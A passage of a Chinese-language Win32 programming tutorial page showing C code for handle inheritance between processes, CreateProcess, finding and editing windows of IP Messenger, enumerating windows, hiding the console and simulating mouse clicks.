\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">进程B代码：\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">DWORD dwProcessHandle = -1;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">DWORD dwThreadHandle = -1;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">char szBuffer[256] = &#123;0&#125;;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">memcpy(szBuffer,argv[1],8);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">sscanf(szBuffer,&quot;%x&quot;,&amp;dwProcessHandle);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">memset(szBuffer,0,256);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">memcpy(szBuffer,argv[2],8);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">sscanf(szBuffer,&quot;%x&quot;,&amp;dwThreadHandle);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">printf(&quot;获取IE进程、主线程句柄\\n&quot;);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">Sleep(2000);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">//挂起主线程\t\t\t\t\t\t\t\t</span><br><span class=\"line\">printf(&quot;挂起主线程\\n&quot;);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">::SuspendThread((HANDLE)dwThreadHandle);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">Sleep(5000);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">//恢复主线程\t\t\t\t\t\t\t\t</span><br><span class=\"line\">::ResumeThread((HANDLE)dwThreadHandle);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">printf(&quot;恢复主线程\\n&quot;);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">Sleep(5000);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">//关闭ID进程\t\t\t\t\t\t\t\t</span><br><span class=\"line\">::TerminateProcess((HANDLE)dwProcessHandle,1);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">::WaitForSingleObject((HANDLE)dwProcessHandle, INFINITE);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">printf(&quot;ID进程已经关闭.....\\n&quot;);\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">图解\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">A:\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\tTCHAR szCmdline[] =TEXT(&quot;c://program files//internet explorer//iexplore.exe&quot;);\t\t\t\t</span><br><span class=\"line\">X\t进程内核\t1\t\tCreateProcess(\t\t\t\t</span><br><span class=\"line\">Y\t线程内核\t1\t\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">BOOL CreateProcess(\t\t\t\t\t\t</span><br><span class=\"line\">  LPCTSTR lpApplicationName,                 // name of executable module\t\t\t\t\t\t</span><br><span class=\"line\">  LPTSTR lpCommandLine,                      // command line string\t\t\t\t\t\t</span><br><span class=\"line\">  LPSECURITY_ATTRIBUTES lpProcessAttributes, // SD\t\t\t\t\t\t</span><br><span class=\"line\">  LPSECURITY_ATTRIBUTES lpThreadAttributes,  // SD\t\t\t\t\t\t</span><br><span class=\"line\">  BOOL bInheritHandles,                      // handle inheritance option\t\t\t\t\t\t</span><br><span class=\"line\">  DWORD dwCreationFlags,                     // creation flags\t\t\t\t\t\t</span><br><span class=\"line\">  LPVOID lpEnvironment,                      // new environment block\t\t\t\t\t\t</span><br><span class=\"line\">  LPCTSTR lpCurrentDirectory,                // current directory name\t\t\t\t\t\t</span><br><span class=\"line\">  LPSTARTUPINFO lpStartupInfo,               // startup information\t\t\t\t\t\t</span><br><span class=\"line\">  LPPROCESS_INFORMATION lpProcessInformation // process information\t\t\t\t\t\t</span><br><span class=\"line\">);\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">1、获取当前进程所使用的目录\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">char szBuffer[256] = &#123;0&#125;;\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">GetCurrentDirectory(256,szBuffer);\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">printf(&quot;%s\\n&quot;,szBuffer);\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">2、观察下面的代码\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">STARTUPINFO ie_si = &#123;0&#125;;   \t\t\t\t\t\t</span><br><span class=\"line\">PROCESS_INFORMATION ie_pi;\t\t\t\t\t\t</span><br><span class=\"line\">ie_si.cb = sizeof(ie_si);\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t</span><br><span class=\"line\">TCHAR szBuffer[256] = &quot;E:\\\\Project\\\\z2\\\\Debug\\\\z2.exe&quot;;\t\t\t\t\t\t</span><br><span class=\"line\">CreateProcess(\t\t\t\t\t\t</span><br><span class=\"line\">\tNULL,                    // name of executable module\t\t\t\t\t</span><br><span class=\"line\">\tszBuffer,                      \t\t    // command line string\t\t\t</span><br><span class=\"line\">\tNULL, \t\t    // SD\t\t\t</span><br><span class=\"line\">\tNULL,  \t\t    // SD\t\t\t</span><br><span class=\"line\">\tFALSE,                      \t\t    // handle inheritance option\t\t\t</span><br><span class=\"line\">\tCREATE_NEW_CONSOLE,     \t\t    // creation flags  \t\t\t</span><br><span class=\"line\">\tNULL,                    // new environment block\t\t\t\t\t</span><br><span class=\"line\">\tNULL,                    // current directory name\t\t\t\t\t</span><br><span class=\"line\">\t&amp;ie_si,                  // startup information\t\t\t\t\t</span><br><span class=\"line\">\t&amp;ie_pi                   // process information\t\t\t\t\t</span><br><span class=\"line\">\t);\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"鼠标按键事件\"><a class=\"markdownIt-Anchor\" href=\"#鼠标按键事件\">#</a> 鼠标按键事件</h3>\n<p>可以通过 spy++ 获取窗口句柄和类，但是这个会变。</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230829201046144.png\" alt=\"image-20230829201046144\"></p>\n<p><code>FindWindow('类名','窗口标题名');</code></p>\n<p><code>SetWindowText('句柄','标题')</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查找指定窗口\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">TCHAR szTitle[MAX_PATH] = &#123;<span class=\"number\">0</span>&#125;;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">HWND hwnd = ::FindWindow(TEXT(<span class=\"string\">&quot;#32770&quot;</span>),TEXT(<span class=\"string\">&quot;飞鸽传书  IP Messenger&quot;</span>));\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(hwnd != <span class=\"literal\">NULL</span>)\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//修改窗口标题\t\t\t\t\t\t\t</span></span><br><span class=\"line\">\t::SetWindowText(hwnd,<span class=\"string\">&quot;新的窗口标题&quot;</span>);\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">else</span>\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t::MessageBox(<span class=\"literal\">NULL</span>,TEXT(<span class=\"string\">&quot;窗口没有找到&quot;</span>),TEXT(<span class=\"string\">&quot;[ERROR]&quot;</span>),MB_OK);\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">窗口控制\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">TCHAR szTitle[MAX_PATH] = &#123;<span class=\"number\">0</span>&#125;;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">HWND hwnd = ::FindWindow(TEXT(<span class=\"string\">&quot;#32770&quot;</span>),TEXT(<span class=\"string\">&quot;飞鸽传书  IP Messenger&quot;</span>));\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(hwnd != <span class=\"literal\">NULL</span>)\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 从user32.dll 中加载函数</span></span><br><span class=\"line\">\t<span class=\"keyword\">typedef</span> <span class=\"title function_\">void</span> <span class=\"params\">(WINAPI *PSWITCHTOTHISWINDOW)</span> <span class=\"params\">(HWND,BOOL)</span>;\t\t\t\t\t\t\t</span><br><span class=\"line\">\tPSWITCHTOTHISWINDOW SwitchToThisWindow;\t\t\t\t\t\t\t</span><br><span class=\"line\">\tHMODULE hUser32=LoadLibrary(<span class=\"string\">&quot;user32.dll&quot;</span>);\t\t\t\t\t\t\t</span><br><span class=\"line\">\tSwitchToThisWindow=(PSWITCHTOTHISWINDOW)GetProcAddress(hUser32,<span class=\"string\">&quot;SwitchToThisWindow&quot;</span>);\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//切换窗口\t\t\t\t\t\t\t</span></span><br><span class=\"line\">\tSwitchToThisWindow(hwnd,<span class=\"literal\">false</span>);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\tSleep(<span class=\"number\">3000</span>);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//关闭窗口 \t\t\t\t\t\t\t</span></span><br><span class=\"line\">\t::SendMessage(hwnd,WM_CLOSE,<span class=\"number\">0</span>,<span class=\"number\">0</span>);\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">else</span>\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t::MessageBox(<span class=\"literal\">NULL</span>,TEXT(<span class=\"string\">&quot;窗口没有找到&quot;</span>),TEXT(<span class=\"string\">&quot;[ERROR]&quot;</span>),MB_OK);\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">查找子窗口\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">TCHAR szTitle[MAX_PATH] = &#123;<span class=\"number\">0</span>&#125;;\t\t\t\t\t\t\t</span><br><span class=\"line\">HWND hwnd = ::FindWindow(TEXT(<span class=\"string\">&quot;#32770&quot;</span>),TEXT(<span class=\"string\">&quot;飞鸽传书  IP Messenger&quot;</span>));\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(hwnd != <span class=\"literal\">NULL</span>)\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//查找子窗口\t\t\t\t\t\t</span></span><br><span class=\"line\">\tHWND hEdit = FindWindowEx(hwnd,<span class=\"literal\">NULL</span>,<span class=\"string\">&quot;Edit&quot;</span>,<span class=\"string\">&quot;&quot;</span>);\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//设置窗口标题\t\t\t\t\t\t</span></span><br><span class=\"line\">\t::SetWindowText(hEdit,<span class=\"string\">&quot;文本框新的标题&quot;</span>);\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//修改内容\t\t\t\t\t\t</span></span><br><span class=\"line\">\t::SendMessage(hEdit,WM_SETTEXT,<span class=\"number\">0</span>,(LPARAM)<span class=\"string\">&quot;新的内容&quot;</span>);\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">else</span>\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t::MessageBox(<span class=\"literal\">NULL</span>,TEXT(<span class=\"string\">&quot;窗口没有找到&quot;</span>),TEXT(<span class=\"string\">&quot;[ERROR]&quot;</span>),MB_OK);\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t</span><br><span class=\"line\">TCHAR szTitle[MAX_PATH] = &#123;<span class=\"number\">0</span>&#125;;\t\t\t\t\t\t\t</span><br><span class=\"line\">HWND hwnd = ::FindWindow(TEXT(<span class=\"string\">&quot;#32770&quot;</span>),TEXT(<span class=\"string\">&quot;飞鸽传书  IP Messenger&quot;</span>));\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(hwnd != <span class=\"literal\">NULL</span>)\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//查找子窗口\t\t\t\t\t\t</span></span><br><span class=\"line\">\tHWND hEdit =::GetDlgItem(hwnd,<span class=\"number\">0x3E9</span>);\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//获取内容\t\t\t\t\t\t</span></span><br><span class=\"line\">\t::SendMessage(hEdit,WM_GETTEXT,MAX_PATH,(LPARAM)szTitle);\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"comment\">//修改内容\t\t\t\t\t\t</span></span><br><span class=\"line\">\t::SendMessage(hEdit,WM_SETTEXT,<span class=\"number\">0</span>,(LPARAM)<span class=\"string\">&quot;新的内容&quot;</span>);\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t</span><br><span class=\"line\"><span class=\"keyword\">else</span>\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t::MessageBox(<span class=\"literal\">NULL</span>,TEXT(<span class=\"string\">&quot;窗口没有找到&quot;</span>),TEXT(<span class=\"string\">&quot;[ERROR]&quot;</span>),MB_OK);\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>查找子窗口：找到对应的窗口，右键属性，找到 controll id</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230829203807122.png\" alt=\"image-20230829203807122\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">枚举子窗口\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">BOOL CALLBACK <span class=\"title function_\">EnumChildProc</span><span class=\"params\">(HWND hWnd,LPARAM lParam)</span>  \t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;  \t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">    TCHAR szTitle[MAX_PATH] = &#123;<span class=\"number\">0</span>&#125;;\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">    ::GetWindowText(hWnd,szTitle,MAX_PATH); \t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">    MessageBox(<span class=\"literal\">NULL</span>,szTitle,<span class=\"string\">&quot;[子窗口]&quot;</span>,MB_OK);  \t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;  \t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125;  \t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">VOID <span class=\"title function_\">EnumChildWindow</span><span class=\"params\">()</span>\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\tTCHAR szTitle[MAX_PATH] = &#123;<span class=\"number\">0</span>&#125;;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\tHWND hWnd = ::FindWindow(TEXT(<span class=\"string\">&quot;#32770&quot;</span>),TEXT(<span class=\"string\">&quot;飞鸽传书  IP Messenger&quot;</span>));\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(hWnd != <span class=\"literal\">NULL</span>)\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t&#123;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t::EnumChildWindows(hWnd,EnumChildProc,<span class=\"number\">0</span>);  \t\t\t\t\t\t\t</span><br><span class=\"line\">\t&#125;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t&#123;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t::MessageBox(<span class=\"literal\">NULL</span>,TEXT(<span class=\"string\">&quot;窗口没有找到&quot;</span>),TEXT(<span class=\"string\">&quot;[ERROR]&quot;</span>),MB_OK);\t\t\t\t\t\t\t</span><br><span class=\"line\">\t&#125;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\">枚举所有打开窗口\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\t\t\t\t\t\t\t</span><br><span class=\"line\">BOOL CALLBACK <span class=\"title function_\">EnumOpenWindowProc</span><span class=\"params\">(HWND hWnd,LPARAM lParam)</span>  \t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;  \t\t\t\t\t\t\t\t</span><br><span class=\"line\">    TCHAR szTitle[MAX_PATH] = &#123;<span class=\"number\">0</span>&#125;;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">    ::GetWindowText(hWnd,szTitle,MAX_PATH); \t\t\t\t\t\t\t\t</span><br><span class=\"line\">    MessageBox(<span class=\"literal\">NULL</span>,szTitle,<span class=\"string\">&quot;[窗口]&quot;</span>,MB_OK);  \t\t\t\t\t\t\t\t</span><br><span class=\"line\">    \t<span class=\"keyword\">if</span>(<span class=\"built_in\">strcmp</span>(szTitle,<span class=\"string\">&quot;飞鸽传书  IP Messenger&quot;</span>) == <span class=\"number\">0</span>)\t\t\t\t\t\t\t</span><br><span class=\"line\">\t&#123;\t\t\t\t\t\t\t</span><br><span class=\"line\">\t\tMessageBox(<span class=\"literal\">NULL</span>,szTitle,<span class=\"string\">&quot;[窗口]&quot;</span>,MB_OK);  \t\t\t\t\t\t</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> FALSE;\t\t\t\t\t\t</span><br><span class=\"line\">\t&#125;\t\t\t\t\t\t\t</span><br><span class=\"line\">    <span class=\"keyword\">return</span> TRUE;  <span class=\"comment\">// true 会一直遍历窗口\t\t\t\t\t\t\t\t</span></span><br><span class=\"line\">&#125;  \t\t\t\t\t\t\t\t</span><br><span class=\"line\">VOID <span class=\"title function_\">EnumOpenWindows</span><span class=\"params\">()</span>\t\t\t\t\t\t\t\t</span><br><span class=\"line\">&#123;\t\t\t\t\t\t\t\t</span><br><span class=\"line\">\tEnumWindows(EnumOpenWindowProc,<span class=\"literal\">NULL</span>);\t\t\t\t\t\t\t</span><br><span class=\"line\">&#125;\t\t\t\t\t\t\t\t</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">隐藏控制台\t</span><br><span class=\"line\">\t</span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">pragma</span>   comment(linker,<span class=\"string\">&quot;/subsystem:\\&quot;windows\\&quot;  /entry:\\&quot;mainCRTStartup\\&quot;&quot;</span>   ) \t</span></span><br><span class=\"line\">\t</span><br><span class=\"line\">模拟鼠标单击\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t</span><br><span class=\"line\">TCHAR szTitle[MAX_PATH] = &#123;<span class=\"number\">0</span>&#125;;\t</span><br><span class=\"line\">RECT r;\t</span><br><span class=\"line\">HWND hwnd = ::FindWindow(TEXT(<span class=\"string\">&quot;#32770&quot;</span>),TEXT(<span class=\"string\">&quot;飞鸽传书  IP Messenger&quot;</span>));\t</span><br><span class=\"line\"><span class=\"keyword\">if</span>(hwnd != <span class=\"literal\">NULL</span>)\t</span><br><span class=\"line\">&#123;\t</span><br><span class=\"line\">\tHWND hButton = FindWindowEx(hwnd,<span class=\"literal\">NULL</span>,<span class=\"string\">&quot;Button&quot;</span>,<span class=\"string\">&quot;刷新(&amp;R)&quot;</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//获取窗口坐标</span></span><br><span class=\"line\">\t::GetWindowRect(hButton,&amp;r);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;%d %d&quot;</span>,r.left,r.top);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\t<span class=\"comment\">//设置鼠标的位置</span></span><br><span class=\"line\">\t::SetCursorPos(r.left+<span class=\"number\">10</span>,r.top+<span class=\"number\">10</span>);</span><br><span class=\"line\">\tSleep(<span class=\"number\">2000</span>);</span><br><span class=\"line\">\t<span class=\"comment\">//鼠标左键单击</span></span><br><span class=\"line\">\tmouse_event(MOUSEEVENTF_LEFTDOWN,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);<span class=\"comment\">//点下左键 </span></span><br><span class=\"line\">\tmouse_event(MOUSEEVENTF_LEFTUP,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>,<span class=\"number\">0</span>);<span class=\"comment\">//松开左键</span></span><br><span class=\"line\">&#125;\t</span><br><span 